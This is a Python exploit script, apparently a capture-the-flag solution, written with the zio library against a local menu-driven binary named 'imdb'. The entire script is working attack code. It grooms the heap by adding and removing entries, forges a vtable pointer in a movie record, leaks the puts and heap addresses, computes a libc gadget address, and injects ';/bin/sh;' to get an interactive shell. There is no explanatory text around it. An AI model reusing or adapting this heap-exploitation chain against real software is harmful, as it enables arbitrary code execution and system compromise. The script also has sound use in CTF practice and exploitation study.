from zio import *
import struct

target = "./imdb"

def full_with(data, size, repeat = "a"):
	return data.ljust(size, repeat)

def ad_tv(io, name, season, rating, introduction):
	io.read_until("?")
	io.write("1\n")
	io.read_until("?")
	io.write(name + "\n")
	io.read_until("?")
	io.write(str(season) + "\n")
	io.read_until("?")
	io.write(str(rating) + "\n")
	io.read_until("?")
	io.write(introduction + "\n")

def ad_movie(io, name, actors, rating, introduction):
	io.read_until("?")
	io.write("2\n")
	io.read_until("?")
	io.write(name + "\n")
	io.read_until("?")
	io.write(actors + "\n")
	io.read_until("?")
	io.write(str(rating) + "\n")
	io.read_until("?")
	io.write(introduction + "\n")

def remove_entry(io, name):
	io.read_until("?")
	io.write("3\n")
	io.read_until("?")
	io.write(name + "\n")

def show_all(io):
	io.read_until("?")
	io.write("4\n")

def get_puts_and_heap_addr(io):
	io.read_until("?")
	io.write("4\n")

	io.read_until("<llllllll>")
	io.read_until("actors: ")
	data = io.read_until("\n").strip("\n")
	print [c for c in data]
	print hex(l64(data.ljust(8, '\x00')))
	puts_addr = l64(data.ljust(8, '\x00'))

	io.read_until("<kkkkkkkk>")
	io.read_until("actors: ")
	data = io.read_until("\n").strip("\n")
	print [c for c in data]
	print hex(l64(data.ljust(8, '\x00')))
	heap_addr = l64(data.ljust(8, '\x00'))
	return puts_addr, heap_addr

def get_io(target):
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, 'green'), print_write = COLORED(RAW, 'blue'))
	return io

def pwn(io):

	puts_addr = l64(0x0000000000601c40)
	heap_addr = l64(0x0000000000601DC0)
	add_movie_vt = l64(0x00000000004015B0)
	#raw_input(":")
	ad_tv(io, "aaa", 1, 2, "iii")#0x18aa010
	ad_tv(io, "aaa", 1, 2, "iii")#0x18aa0f0
	ad_tv(io, "aaa", 1, 2, "iii")#0x18aa1d0
	remove_entry(io, "aaa")#0x18aa010, 0x18aa0f0
	data = add_movie_vt + full_with("l" * 8, 0x40, '\x00') + full_with("i" * 8, 0x80, '\x00') + l64(2) + puts_addr
	print "len(data):", hex(len(data))
	ad_movie(io, "x" * 8, data, 2, "jjj")


	ad_tv(io, "bbb", 1, 2, "iii")#0x18aa1e0
	ad_tv(io, "bbb", 1, 2, "iii")#0x18aa2c0
	ad_tv(io, "bbb", 1, 2, "iii")#0x18aa3a0
	remove_entry(io, "bbb")#0x18aa1e0, 0x18aa2c0
	data = add_movie_vt + full_with("k" * 8, 0x40, '\x00') + full_with("i" * 8, 0x80, '\x00') + l64(2) + heap_addr
	print "len(data):", hex(len(data))
	ad_movie(io, "y" * 8, data, 2, "jjj")

	puts_addr, heap_addr = get_puts_and_heap_addr(io)
	

	ad_tv(io, "ccc", 1, 2, "iii")#0x18aa3b0
	ad_tv(io, "ccc", 1, 2, "iii")#0x18aa490
	ad_tv(io, "ccc", 1, 2, "iii")#0x18aa570
	remove_entry(io, "ccc")#0x18aa3b0, 0x18aa490

	cmd_addr = 0x0000000000044B2C + puts_addr - 0x000000000006FEC0

	fake_vt = l64(0x18aa490 - 0x18aa010 + heap_addr + 0x08)
	data = fake_vt + full_with(l64(cmd_addr) + ";/bin/sh;", 0x40, '\x00') + full_with("i" * 8, 0x80, '\x00') + l64(2) + l64(0x0000000000601DC0)
	print "len(data):", hex(len(data))
	ad_movie(io, "z" * 8, data, 2, "jjj")

	show_all(io)
	io.interact()

io = get_io(target)
pwn(io)